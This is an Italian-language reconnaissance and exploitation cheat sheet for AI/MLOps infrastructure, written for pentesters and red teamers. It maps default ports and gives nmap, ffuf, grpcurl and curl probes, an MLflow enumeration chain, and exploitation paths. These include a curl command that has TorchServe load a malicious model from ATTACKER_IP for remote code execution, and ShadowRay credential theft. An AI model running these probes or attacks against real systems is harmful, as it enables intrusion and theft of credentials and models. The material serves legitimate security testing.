# 🛠️ AI & MLOps Infrastructure Reconnaissance: Technical Cheat Sheet

- **Dominio:** AI/MLOps Security, Infrastructure Reconnaissance, Threat Hunting, Attack Surface Mapping
- **Framework di Riferimento:** MITRE ATLAS, MITRE ATT&CK, OWASP Top 10 for LLMs (2025)
- **Scopo:** Prontuario operativo e tecnico completo per pentester, red teamer e security auditor. Raccoglie porte, comandi di probing, fingerprinting avanzato, rotte API, tecniche di estrazione dei metadati e scenari di exploit.

---

## 1. Mappa delle Porte & Servizi Comuni nell'AI Stack

I servizi AI e MLOps separano spesso il traffico web client (**HTTP/REST**) dal flusso ad alta velocità tra nodi di calcolo (**gRPC**).

### A. Model Serving (Inference Engines)

| Componente / Engine | Porte Predefinite | Protocollo | Endpoint Tipici di Verifica | Rischio & Dati Estratti se Esposto |
| :--- | :--- | :--- | :--- | :--- |
| **NVIDIA Triton** | `8000`, `8001`, `8002` | HTTP, gRPC, Prometheus | `/v2/health/ready`<br>`/v2/models`<br>`/metrics` | Enumera modelli caricati in memoria, batch size, hardware e consumo GPU. |
| **vLLM Engine** | `8000` | HTTP | `/v1/models`<br>`/docs` | Espone API compatibile OpenAI. Permette inferenza non autorizzata o DoS. |
| **TorchServe (PyTorch)** | `8080`, `8081`, `8082` | HTTP | `/ping`<br>`/models`<br>`:8081/models` | La porta `8081` (Management API) consente il caricamento remoto di nuovi modelli (`.mar`). |
| **TensorFlow Serving** | `8500`, `8501` | gRPC, HTTP | `/v1/models/<name>` | Consente il recupero dei metadati di versione del modello e shape dei tensori. |
| **Ollama** | `11434` | HTTP | `/api/tags`<br>`/api/show`<br>`/api/generate` | Espone l'elenco dei modelli scaricati in locale e consente l'esecuzione di prompt arbitrari. |

### B. Vector Databases (Memoria Semantica & Pipeline RAG)

| Database Vettoriale | Porte Predefinite | Protocollo | Endpoint di Verifica | Rischio & Impatto di Sicurezza |
| :--- | :--- | :--- | :--- | :--- |
| **Qdrant** | `6333`, `6334` | HTTP, gRPC | `/collections`<br>`/telemetry` | Espone collezioni documentali indicizzate e dimensionalità dei vettori. |
| **Weaviate** | `8080` | HTTP, GraphQL | `/v1/schema`<br>`/v1/meta`<br>`/v1/graphql` | Interrogazione GraphQL non autenticata per scaricare documenti testuali interni. |
| **Milvus** | `19530` | gRPC | Connessione client Milvus | Storage vettoriale distribuito: accesso diretto a record aziendali serializzati. |
| **ChromaDB** | `8000` | HTTP | `/api/v1/collections` | Database documentale RAG: dump completo delle collezioni di knowledge base. |

### C. Orchestration, Tracking & Notebooks

| Piattaforma / Tool | Porte Predefinite | Protocollo | Endpoint di Verifica | Note & Rischi Noti |
| :--- | :--- | :--- | :--- | :--- |
| **MLflow Tracking** | `5000` | HTTP | `/api/2.0/mlflow/experiments/search`<br>`/#/experiments` | Parametri di training, dataset, tag con commit git e link ad artifact su bucket cloud. |
| **Ray Cluster** | `8265`, `8000` | HTTP | `/api/jobs/`<br>`Ray Dashboard` | Bersaglio campagna *ShadowRay*: esecuzione comandi remoti e cryptomining su nodi GPU. |
| **Kubeflow** | `80`, `443` | HTTP/S | `/pipeline/apis/v1beta1/pipelines` | Orchestrazione su Kubernetes: creazione notebook con ServiceAccounts privilegiati. |
| **Jupyter Notebook** | `8888` | HTTP | `/api/kernels`<br>`/api/contents` | Se configurato con `--ip=0.0.0.0` e senza token, offre shell/terminale interattivo diretto. |
| **MinIO (Object Store)** | `9000`, `9001` | HTTP (S3) | `/minio/health/ready`<br>Console Web | Ospita i file pesanti dei modelli (`.pkl`, `.onnx`, `.pt`). Spesso con bucket listing aperto. |

---

## 2. Scansione & Discovery di Rete (Nmap)

```bash
# Scansione mirata sulle porte tipiche dei servizi AI / Vector DB / MLOps
nmap -p 5000,6333,6334,8000,8001,8002,8080,8081,8082,8265,8500,8501,8888,9000,9001,11434,19530 -sV -sC -oN ai_recon.txt <TARGET_IP>
```

> [!NOTE]
> Le porte `8001` (Triton) e `8500` (TF Serving) utilizzano **gRPC** (binario). Nmap potrebbe rilevarle come servizi sconosciuti. Usa `grpcurl` per interrogarle.

---

## 3. Fingerprinting Avanzato: Header, Firme JSON ed Errori

### A. HTTP Header Fingerprinting
* **TorchServe:** Header distintivo `Server: TorchServe/0.x.x`.
* **NVIDIA Triton:**
  * Inserisce l'header `NV-Status` nelle risposte HTTP.
  * Inviando l'header di richiesta `endpoint-load-metrics-format: text`, Triton restituisce la telemetria hardware in tempo reale (CPU/GPU) direttamente negli header di risposta.
* **Servizi ML basati su FastAPI:** Header `Server: uvicorn`. In combinazione con rotte come `/predict` o `/embeddings`, indica un backend ML in Python.
* **Wrapper compatibili con OpenAI (vLLM, LiteLLM, Ollama):** Header `x-request-id` abbinato all'endpoint `/v1/models`.

### B. Firme del Payload JSON (Response Body)

| Framework / Engine | Firma Tipica del Payload JSON | Caratteristica Identificativa |
| :--- | :--- | :--- |
| **TensorFlow Serving** | `{"model_version_status": [{"version": "1", "state": "AVAILABLE"}]}` | Struttura array rigida per lo stato delle versioni. |
| **NVIDIA Triton** | `{"name": "model_name", "versions": ["1"], "platform": "tensorflow_graphdef"}` | Esplicita nome del modello e piattaforma runtime sottostante. |
| **OpenAI-Compatible** | `{"object": "model", "id": "llama-3.1-8b", "created": 1700000000}` | Campo `"object": "model"` tipico dello standard API OpenAI. |
| **MLflow Server** | Errori contenenti namespace `mlflow.server` o `mlflow.tracking` | Rivelatore immediato dello stack anche in caso di eccezione. |

### C. Error Message Fingerprinting (Iniezione di Dati Malformati)
Inviare un tipo di dato errato (es. un intero grezzo invece di un tensore multidimensionale):
* **TensorFlow Serving:** Restituisce errori contenenti la stringa esclusiva `tensorinfo_map`.
* **MLflow:** Stack trace con namespace `mlflow.server`, `mlflow.tracking` o riferimenti a `databricks`. Rischio path traversal (es. **CVE-2024-1558**).
* **Databricks Mosaic AI:** Token JWT malformati restituiscono eccezioni Java esplicite (`io.jsonwebtoken.IncorrectClaimException`).

---

## 4. Wordlist per Route Fuzzing & Naming Convention delle API AI

A differenza delle REST API tradizionali che usano sostantivi (`/users`, `/orders`), le API AI usano **termini legati ad azioni computazionali**:

```bash
# Esempio fuzzing rotte con ffuf
ffuf -u http://<TARGET_IP>:8000/FUZZ -w ai_routes_wordlist.txt -mc 200,401,403
```

### Wordlist Consigliata per Servizi AI/ML:
```text
/v1/models
/v2/models
/v2/health/ready
/v2/models/{model_name}/config
/predict
/invocations
/infer
/generate
/embeddings
/score
/api/2.0/mlflow/experiments/search
/api/2.0/mlflow/registered-models/list
/api/2.0/mlflow/model-versions/search
/pipeline/apis/v1beta1/pipelines
/api/serve/deployments/
/v1/schema
/v1/meta
/v1/graphql
/api/kernels
/api/contents
/openapi.json
/docs
/graphql
/metrics
/api/tags
/api/show
/collections
/healthz
/ping
```

---

## 5. Ispezione Protocolli Binari: gRPC Fingerprinting

Quando le porte `8001` (Triton) o `8500` (TensorFlow Serving) sono aperte:

```bash
# 1. Elenco dei servizi RPC esposti (se gRPC Reflection è abilitata)
grpcurl -plaintext <TARGET_IP>:8001 list

# 2. Descrizione dell'interfaccia e formato dei tensori di input/output
grpcurl -plaintext <TARGET_IP>:8001 describe inference.GRPCInferenceService
```

> Ottenere lo schema Protobuf corrisponde a ottenere la specifica completa dei tensori di input e output del modello.

---

## 6. Katana MLflow: Catena di Enumerazione API in 5 Passaggi

Se identifichi un server **MLflow** (porta `5000`), esegui in sequenza:

```
[1. Search Experiments] ──> [2. List Models] ──> [3. Search Versions] ──> [4. Search Runs] ──> [5. List Artifacts]
```

```bash
# Step 1: Enumerazione degli Esperimenti (estrae nomi di progetti riservati)
curl -s -X POST http://<TARGET_IP>:5000/api/2.0/mlflow/experiments/search

# Step 2: Inventario dei Modelli Registrati (catalogo modelli dell'azienda)
curl -s http://<TARGET_IP>:5000/api/2.0/mlflow/registered-models/list

# Step 3: Dettagli Versioni e Percorsi Bucket (estrae URI s3://, user_id, deployment status)
curl -s http://<TARGET_IP>:5000/api/2.0/mlflow/model-versions/search

# Step 4: Ispezione dei Training Run (estrae tag con commit hash Git e repo interni)
curl -s -X POST http://<TARGET_IP>:5000/api/2.0/mlflow/runs/search -d '{}'

# Step 5: Mappatura degli Artifact Scaricabili (.pkl, .onnx, .pt)
curl -s "http://<TARGET_IP>:5000/api/2.0/mlflow/artifacts/list?run_id=<RUN_ID>"
```

---

## 7. Probe Rapidi con curl per Altri Servizi AI

### NVIDIA Triton (8000 / 8002)
```bash
# Controllo stato ed elenco modelli
curl -s http://<TARGET_IP>:8000/v2/health/ready
curl -s http://<TARGET_IP>:8000/v2/models

# Estrazione metadati, tensori e backend di un modello
curl -s http://<TARGET_IP>:8000/v2/models/<MODEL_NAME>/config

# Metriche hardware, modelli caricati in VRAM e batch size da Prometheus
curl -s http://<TARGET_IP>:8002/metrics | grep -i "model"
```

### Ollama (11434)
```bash
# Elenco modelli scaricati
curl -s http://<TARGET_IP>:11434/api/tags

# Dettagli architettura e system prompt di un modello
curl -s -X POST http://<TARGET_IP>:11434/api/show -d '{"name": "llama3"}'
```

### Vector DB Qdrant & Weaviate
```bash
# Qdrant: elenco collezioni e metadati
curl -s http://<TARGET_IP>:6333/collections
curl -s http://<TARGET_IP>:6333/collections/<COLLECTION_NAME>

# Weaviate: schema e introspezione
curl -s http://<TARGET_IP>:8080/v1/schema
curl -s http://<TARGET_IP>:8080/v1/meta
```

### Jupyter Notebook (8888)
```bash
# Verifica apertura senza autenticazione e lettura filesystem
curl -s http://<TARGET_IP>:8888/api/contents
curl -s http://<TARGET_IP>:8888/api/kernels
```

---

## 8. Misconfigurazioni & Vettori di Sfruttamento (Exploit Chains)

### A. Campagna ShadowRay (CVE-2023-48022) — Ray Framework
* **Target:** Porta `8265` (Dashboard & Job Submission API di Ray).
* **Vulnerabilità:** Progettata senza autenticazione integrata.
* **Exploit:**
  1. Invio di job non autenticati su `/api/jobs/` con payload Python o bash arbitrari.
  2. Esecuzione comandi sui worker node, lettura di variabili d'ambiente (`printenv`) ed estrazione di chiavi AWS IAM / token cloud.
  3. Movimento laterale verso l'infrastruttura cloud e cryptomining non autorizzato su cluster GPU.

### B. TorchServe Management API (Porta 8081)
* **Vulnerabilità:** Management API esposta pubblicamente.
* **Exploit:** L'endpoint consente di registrare un modello a partire da un URL esterno:
  ```bash
  curl -X POST "http://<TARGET_IP>:8081/models?url=http://<ATTACKER_IP>/malicious_model.mar"
  ```
  TorchServe esegue il file di inizializzazione Python contenuto nel pacchetto `.mar`, portando a **Remote Code Execution (RCE)**.

### C. Kubeflow Dashboards & Cluster Takeover
* Le dashboard esposte senza autenticazione federata OIDC consentono di creare istanze Jupyter.
* I pod dei notebook vengono frequentemente montati con *Kubernetes Service Accounts* dotati di ampi permessi RBAC, permettendo la compromissione dell'intero cluster K8s.

### D. Furto di Modelli & Catena IBM X-Force Red
```
[Phishing / Credenziali] ──> [Jupyter Notebook (.env / chiavi in chiaro)]
                                      │
                                      ▼
[Storage Cloud S3 (Artifacts)] <── [MLflow API (Enumerazione con MLOKit)]
```
1. Compromissione di un notebook contenente chiavi `MLFLOW_TRACKING_USERNAME` e `MLFLOW_TRACKING_PASSWORD`.
2. Uso del tool **MLOKit** (`list-models`, `download-model`).
3. Download diretto dei file pesanti dei modelli dai bucket S3 collegati tramite credenziali legittime.
4. Potenziale avvelenamento (`poison-model`) sovrascrivendo l'artifact nel registro.

### E. Supply Chain: Hugging Face Tokens & Dependency Confusion
* **Token HF (`HF_TOKEN`):** Se individuati in file `.env`, repository GitHub pubblici o log di build, garantiscono accesso in lettura e scrittura a modelli e dataset privati.
* **Dependency Confusion:** Pacchetti Python interni usati nei file `requirements.txt` (es. `company-internal-ml`) che non risultano registrati pubblicamente su PyPI possono essere registrati da terzi per forzare l'infezione della pipeline di training durante la build.
